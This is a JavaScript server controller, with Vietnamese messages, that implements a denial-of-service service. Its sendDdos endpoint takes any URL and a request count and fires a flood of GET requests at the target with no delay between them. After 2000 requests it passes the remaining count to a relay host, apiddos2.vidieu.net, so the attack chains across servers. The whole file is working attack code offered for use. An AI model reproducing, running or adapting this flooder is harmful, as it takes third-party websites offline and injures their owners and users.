import axios from "axios";

const sendRequest = async (url) => {
  await axios.get(url).catch(() => {});
};
function Ddos(link, max) {
  let count = 0;
  const inter = setInterval(() => {
    count++;
    sendRequest(link);
    if (count >= max) {
      clearInterval(inter);
    }
    if (count >= 2000) {
      max = max - 2000;
      axios
        .get(`http://apiddos2.vidieu.net/api/ddos?link=${link}&max=${max}`)
        .catch(() => {});
      clearInterval(inter);
    }
  }, 0);
}
function isValidURL(str) {
  const urlPattern =
    /^(https?:\/\/)?([\w-]+(\.[\w-]+)+)([\w.,@?^=%&:/~+#-]*[\w@?^=%&/~+#-])?$/;
  return urlPattern.test(str);
}
export const sendDdos = async (req, res) => {
  if (isNaN(req.query.max)) {
    return res.json({
      code: 400,
      message: "Số lần tấn công phải là số",
    });
  }
  if (isValidURL(req.query.link)) {
    Ddos(req.query.link, req.query.max);
  } else {
    return res.json({
      code: 400,
      message: "Link sai định dạng",
    });
  }
  res.json({
    code: 200,
    message: `Đã gửi request tấn công website: ${req.query.link}`,
  });
};
